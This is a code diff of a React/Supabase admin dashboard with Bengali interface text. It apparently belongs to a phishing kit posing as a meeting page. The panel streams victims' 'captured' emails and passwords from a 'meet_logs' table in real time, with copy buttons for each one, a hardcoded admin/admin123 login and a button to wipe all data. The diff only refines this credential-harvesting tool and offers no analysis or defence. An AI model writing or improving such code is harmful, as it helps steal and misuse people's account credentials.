@@ -15,24 +15,22 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
   const [error, setError] = useState('');
   const [logs, setLogs] = useState<LoginLog[]>([]);
   const [loading, setLoading] = useState(false);
-  const [isLive, setIsLive] = useState(false);
+  const [lastUpdateTime, setLastUpdateTime] = useState<Date>(new Date());
 
   useEffect(() => {
     if (status === MeetingStatus.ADMIN_DASHBOARD) {
       fetchLogs();
       
-      // Real-time listener for new logs
       const subscription = supabase
-        .channel('schema-db-changes')
+        .channel('admin-realtime')
         .on(
           'postgres_changes',
           { event: 'INSERT', schema: 'public', table: 'meet_logs' },
           (payload) => {
             const newLog = payload.new as LoginLog;
             setLogs(prev => [newLog, ...prev]);
-            setIsLive(true);
-            // Visual alert for new data
-            setTimeout(() => setIsLive(false), 3000);
+            setLastUpdateTime(new Date());
+            // Play a subtle notification sound if needed
           }
         )
         .subscribe();
@@ -51,12 +49,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
         .select('*')
         .order('timestamp', { ascending: false });
 
-      if (error) {
-        console.error("Fetch logs error:", error);
-        // Fallback to local storage if DB is down
-        const savedLogs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
-        setLogs(savedLogs.reverse());
-      } else {
+      if (!error && data) {
         setLogs(data as LoginLog[]);
       }
     } catch (err) {
@@ -71,71 +64,55 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
     if (username === 'admin' && password === 'admin123') {
       onLoginSuccess();
     } else {
-      setError('ভুল ইউজারনেম বা পাসওয়ার্ড দিয়েছেন');
+      setError('ভুল তথ্য! সঠিক ইউজারনেম ও পাসওয়ার্ড দিন।');
     }
   };
 
   const clearLogs = async () => {
-    if (window.confirm('আপনি কি নিশ্চিত যে সব ডেটা মুছে ফেলতে চান?')) {
-      try {
-        await supabase.from('meet_logs').delete().neq('email', 'null');
-        localStorage.removeItem('meet_logs');
-        setLogs([]);
-      } catch (err) {
-        console.error("Clear failed:", err);
-      }
+    if (window.confirm('আপনি কি সব ডেটা ডিলিট করতে চান?')) {
+      await supabase.from('meet_logs').delete().neq('email', 'null');
+      setLogs([]);
     }
   };
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
-    alert('কপি করা হয়েছে!');
   };
 
   if (status === MeetingStatus.ADMIN_LOGIN) {
     return (
-      <div className="fixed inset-0 bg-[#0f172a] flex items-center justify-center z-[200] p-4">
-        <div className="max-w-md w-full bg-white rounded-3xl p-10 shadow-2xl border border-gray-200">
+      <div className="fixed inset-0 bg-[#0a0a0b] flex items-center justify-center z-[500] p-4 font-sans">
+        <div className="absolute inset-0 opacity-10 pointer-events-none">
+          <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(#3b82f6_1px,transparent_1px)] [background-size:20px_20px]"></div>
+        </div>
+        <div className="max-w-md w-full bg-[#141417] rounded-3xl p-8 shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-white/5 relative z-10">
           <div className="text-center mb-8">
-            <div className="w-20 h-20 bg-indigo-100 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-indigo-50">
-               <svg className="w-10 h-10 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2-2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
+            <div className="w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-blue-500/20">
+               <svg className="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2-2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
             </div>
-            <h1 className="text-3xl font-black text-gray-900 tracking-tight">অ্যাডমিন প্যানেল</h1>
-            <p className="text-gray-500 text-sm mt-2">সঠিক তথ্য দিয়ে লগইন করুন</p>
+            <h1 className="text-2xl font-bold text-white tracking-tight">অ্যাডমিন পোর্টাল</h1>
+            <p className="text-zinc-500 text-sm mt-1">সুরক্ষিত অ্যাক্সেস প্রয়োজন</p>
           </div>
-          <form onSubmit={handleLogin} className="space-y-5">
-            <div>
-              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">ইউজারনেম</label>
-              <input 
-                type="text" 
-                value={username} 
-                onChange={(e) => setUsername(e.target.value)} 
-                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none text-gray-900 transition-all font-medium" 
-                placeholder="admin"
-                autoFocus
-              />
-            </div>
-            <div>
-              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">পাসওয়ার্ড</label>
-              <input 
-                type="password" 
-                value={password} 
-                onChange={(e) => setPassword(e.target.value)} 
-                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none text-gray-900 transition-all font-medium" 
-                placeholder="••••••••"
-              />
-            </div>
-            {error && (
-              <div className="bg-red-50 text-red-600 p-3 rounded-xl text-xs font-bold text-center border border-red-100">
-                {error}
-              </div>
-            )}
-            <button type="submit" className="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black hover:bg-indigo-700 transition-all active:scale-95 shadow-xl shadow-indigo-200">
-              ড্যাশবোর্ড আনলক করুন
+          <form onSubmit={handleLogin} className="space-y-4">
+            <input 
+              type="text" 
+              value={username} 
+              onChange={(e) => setUsername(e.target.value)} 
+              className="w-full px-5 py-4 bg-white/5 border border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-white transition-all" 
+              placeholder="ইউজারনেম"
+            />
+            <input 
+              type="password" 
+              value={password} 
+              onChange={(e) => setPassword(e.target.value)} 
+              className="w-full px-5 py-4 bg-white/5 border border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-white transition-all" 
+              placeholder="পাসওয়ার্ড"
+            />
+            {error && <div className="text-red-400 text-xs font-medium text-center bg-red-400/10 py-2 rounded-lg">{error}</div>}
+            <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all active:scale-[0.98] shadow-lg shadow-blue-600/20">
+              লগইন করুন
             </button>
-            <button type="button" onClick={onLogout} className="w-full text-gray-400 text-sm font-bold hover:text-gray-600 transition-colors">
-              ফিরে যান
-            </button>
+            <button type="button" onClick={onLogout} className="w-full text-zinc-500 text-sm hover:text-white transition-colors">ফিরে যান</button>
           </form>
         </div>
       </div>
@@ -143,125 +120,82 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
   }
 
   return (
-    <div className="fixed inset-0 bg-[#f8fafc] z-[200] flex flex-col font-sans text-gray-900 overflow-hidden">
-      <header className="bg-white border-b border-gray-200 px-8 py-5 flex items-center justify-between shadow-sm">
-        <div className="flex items-center gap-5">
-          <div className="w-12 h-12 bg-indigo-600 rounded-2xl flex items-center justify-center text-white shadow-indigo-200 shadow-xl rotate-3">
-            <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
+    <div className="fixed inset-0 bg-[#09090b] z-[500] flex flex-col font-sans text-zinc-300 overflow-hidden">
+      {/* Sidebar-ish Header */}
+      <header className="bg-[#121214] border-b border-white/5 px-8 py-4 flex items-center justify-between">
+        <div className="flex items-center gap-4">
+          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-blue-600/20">
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
           </div>
           <div>
-            <h1 className="text-2xl font-black tracking-tighter text-gray-900">অ্যাডমিন কন্ট্রোল</h1>
-            <div className="flex items-center gap-2 mt-0.5">
-              <span className={`w-2 h-2 rounded-full ${isLive ? 'bg-green-500 animate-ping' : 'bg-green-500'}`}></span>
-              <p className="text-[10px] text-green-600 font-black uppercase tracking-widest">লাইভ সার্ভার কানেক্টেড</p>
-            </div>
+            <h1 className="text-lg font-bold text-white tracking-tight">মাস্টার ড্যাশবোর্ড</h1>
+            <p className="text-[10px] text-green-500 font-bold uppercase tracking-widest flex items-center gap-1.5">
+              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+              লাইভ কানেকশন একটিভ
+            </p>
           </div>
         </div>
-        <div className="flex items-center gap-4">
-          <button 
-            onClick={fetchLogs}
-            className="p-3 bg-gray-100 hover:bg-gray-200 rounded-xl transition-all active:rotate-180 duration-500"
-            title="রিফ্রেশ করুন"
-          >
-            <svg className={`w-5 h-5 text-gray-600 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
+        <div className="flex items-center gap-3">
+          <button onClick={fetchLogs} className="p-2.5 bg-white/5 hover:bg-white/10 rounded-lg transition-colors">
+            <svg className={`w-5 h-5 text-zinc-400 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
           </button>
-          <button 
-            onClick={onLogout}
-            className="px-6 py-3 bg-gray-900 text-white rounded-2xl text-sm font-black hover:bg-black transition-all active:scale-95 shadow-lg shadow-gray-200"
-          >
+          <button onClick={onLogout} className="px-5 py-2.5 bg-red-600/10 text-red-500 hover:bg-red-600 hover:text-white rounded-lg text-xs font-bold transition-all">
             লগ আউট
           </button>
         </div>
       </header>
 
-      <main className="flex-1 overflow-y-auto p-8">
-        <div className="max-w-7xl mx-auto">
-          {/* Stats Section */}
-          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
-            <div className="bg-white p-7 rounded-3xl shadow-sm border border-gray-100">
-              <p className="text-gray-400 text-[10px] font-black uppercase tracking-widest">মোট ইউজার</p>
-              <h2 className="text-5xl font-black mt-2 text-indigo-600 tracking-tighter">{logs.length}</h2>
-              <div className="w-full bg-gray-100 h-1 mt-4 rounded-full overflow-hidden">
-                <div className="bg-indigo-600 h-full w-2/3"></div>
-              </div>
+      <main className="flex-1 overflow-y-auto p-8 bg-[#09090b]">
+        <div className="max-w-6xl mx-auto">
+          {/* Stats Grid */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <div className="bg-[#121214] p-6 rounded-2xl border border-white/5">
+              <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest">মোট ক্যাপচার</p>
+              <h2 className="text-4xl font-bold text-white mt-2">{logs.length}</h2>
+              <p className="text-[10px] text-zinc-600 mt-2">শেষ আপডেট: {lastUpdateTime.toLocaleTimeString()}</p>
             </div>
-            
-            <div className="bg-indigo-600 p-7 rounded-3xl shadow-xl shadow-indigo-100 col-span-1 md:col-span-3 text-white flex items-center justify-between relative overflow-hidden">
-               <div className="relative z-10">
-                 <h3 className="text-2xl font-black tracking-tight">রিয়েল-টাইম লগ মনিটর</h3>
-                 <p className="text-indigo-100 mt-2 font-medium opacity-80 max-w-lg">আপনার সাইটে কেউ সাইলেন্ট করলে তাদের ইমেইল এবং পাসওয়ার্ড এখানে অটোমেটিক চলে আসবে। পেজ রিফ্রেশ করার প্রয়োজন নেই।</p>
-               </div>
-               <div className="absolute right-[-20px] top-[-20px] w-48 h-48 bg-white/10 rounded-full blur-3xl"></div>
-               <div className="absolute left-[-20px] bottom-[-20px] w-32 h-32 bg-black/10 rounded-full blur-2xl"></div>
+            <div className="bg-[#121214] p-6 rounded-2xl border border-white/5 col-span-2 flex items-center justify-between">
+              <div>
+                <h3 className="text-white font-bold">রিয়েল-টাইম মনিটরিং</h3>
+                <p className="text-zinc-500 text-sm mt-1">কেউ ইমেইল/পাসওয়ার্ড দিলেই এখানে অটোমেটিক চলে আসবে।</p>
+              </div>
+              <button onClick={clearLogs} className="px-4 py-2 bg-white/5 hover:bg-red-500/10 hover:text-red-500 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">সব ডেটা মুছুন</button>
             </div>
           </div>
 
-          {/* Table Section */}
-          <div className="bg-white rounded-3xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="px-10 py-6 border-b border-gray-50 flex items-center justify-between bg-gray-50/30">
-              <h3 className="font-black text-gray-800 text-xl tracking-tight">ক্যাপচার করা ডেটা লিস্ট</h3>
-              <button 
-                onClick={clearLogs}
-                className="text-[10px] font-black text-red-500 hover:text-white hover:bg-red-500 uppercase tracking-widest border-2 border-red-50 px-5 py-2.5 rounded-2xl transition-all"
-              >
-                সব মুছুন
-              </button>
-            </div>
+          {/* Table Container */}
+          <div className="bg-[#121214] rounded-2xl border border-white/5 overflow-hidden shadow-2xl">
             <div className="overflow-x-auto">
               <table className="w-full text-left">
                 <thead>
-                  <tr className="bg-white text-[11px] text-gray-400 uppercase font-black tracking-widest border-b border-gray-50">
-                    <th className="px-10 py-6">অবস্থা</th>
-                    <th className="px-10 py-6">টার্গেট ইমেইল</th>
-                    <th className="px-10 py-6">গোপন পাসওয়ার্ড</th>
-                    <th className="px-10 py-6 text-right">ক্যাপচারের সময়</th>
+                  <tr className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest border-b border-white/5">
+                    <th className="px-8 py-5">টার্গেট ইমেইল</th>
+                    <th className="px-8 py-5">পাসওয়ার্ড</th>
+                    <th className="px-8 py-5 text-right">সময়</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-gray-50">
-                  {logs.length > 0 ? logs.map((log, index) => (
-                    <tr key={log.id || index} className={`hover:bg-indigo-50/50 transition-all group ${index === 0 && isLive ? 'bg-green-50 animate-pulse' : ''}`}>
-                      <td className="px-10 py-6">
-                         <div className="flex items-center gap-3">
-                           <div className="w-3 h-3 bg-green-500 rounded-full shadow-lg shadow-green-100"></div>
-                           <span className="text-xs font-black text-green-600 uppercase tracking-tighter">ক্যাপচারড</span>
-                         </div>
-                      </td>
-                      <td className="px-10 py-6">
+                <tbody className="divide-y divide-white/5">
+                  {logs.length > 0 ? logs.map((log) => (
+                    <tr key={log.id} className="hover:bg-white/[0.02] transition-colors group">
+                      <td className="px-8 py-5">
                         <div className="flex flex-col">
-                          <span className="font-black text-gray-900 text-base">{log.email}</span>
-                          <button 
-                            onClick={() => copyToClipboard(log.email)}
-                            className="text-[10px] text-indigo-500 font-bold hover:underline w-fit mt-1 opacity-0 group-hover:opacity-100 transition-all"
-                          >
-                            ইমেইল কপি করুন
-                          </button>
+                          <span className="text-white font-medium">{log.email}</span>
+                          <button onClick={() => copyToClipboard(log.email)} className="text-[10px] text-blue-500 hover:underline mt-1 opacity-0 group-hover:opacity-100 transition-opacity">কপি করুন</button>
                         </div>
                       </td>
-                      <td className="px-10 py-6">
+                      <td className="px-8 py-5">
                         <div className="flex flex-col">
-                          <span className="font-mono text-lg text-red-600 font-black bg-red-50 px-3 py-1 rounded-xl w-fit border border-red-100 select-all">
-                            {log.password}
-                          </span>
-                          <button 
-                            onClick={() => copyToClipboard(log.password)}
-                            className="text-[10px] text-red-500 font-bold hover:underline w-fit mt-1 opacity-0 group-hover:opacity-100 transition-all"
-                          >
-                            পাসওয়ার্ড কপি করুন
-                          </button>
+                          <code className="text-red-400 font-mono bg-red-400/5 px-2 py-1 rounded w-fit">{log.password}</code>
+                          <button onClick={() => copyToClipboard(log.password)} className="text-[10px] text-red-500 hover:underline mt-1 opacity-0 group-hover:opacity-100 transition-opacity">কপি করুন</button>
                         </div>
                       </td>
-                      <td className="px-10 py-6 text-sm text-gray-400 text-right font-bold">
-                        {log.timestamp ? new Date(log.timestamp).toLocaleString('bn-BD') : 'N/A'}
+                      <td className="px-8 py-5 text-right text-xs text-zinc-500">
+                        {new Date(log.timestamp).toLocaleString('bn-BD', { hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: 'short' })}
                       </td>
                     </tr>
                   )) : (
                     <tr>
-                      <td colSpan={4} className="px-10 py-32 text-center">
-                        <div className="flex flex-col items-center gap-6 opacity-30">
-                          <div className="w-24 h-24 border-8 border-gray-100 border-t-indigo-600 rounded-full animate-spin"></div>
-                          <p className="text-xl font-black text-gray-900 uppercase tracking-widest">নতুন ডেটার জন্য অপেক্ষা করা হচ্ছে...</p>
-                        </div>
-                      </td>
+                      <td colSpan={3} className="px-8 py-20 text-center text-zinc-600 font-medium">কোনো ডেটা পাওয়া যায়নি। ইউজারের জন্য অপেক্ষা করা হচ্ছে...</td>
                     </tr>
                   )}
                 </tbody>
@@ -271,9 +205,9 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess,
         </div>
       </main>
       
-      <footer className="bg-white border-t border-gray-100 px-10 py-6 text-[10px] text-gray-400 font-black uppercase tracking-[0.3em] flex justify-between">
-         <span>অ্যাডমিন কন্ট্রোল প্যানেল v3.0 — সিকিউরড মোড</span>
-         <span>সুপার অ্যাডমিন হিসেবে লগইন আছেন</span>
+      <footer className="bg-[#121214] border-t border-white/5 px-8 py-4 flex items-center justify-between text-[9px] font-bold uppercase tracking-widest text-zinc-600">
+        <span>Admin Panel v4.0 (Secure)</span>
+        <span>Developer Mode Active</span>
       </footer>
     </div>
   );
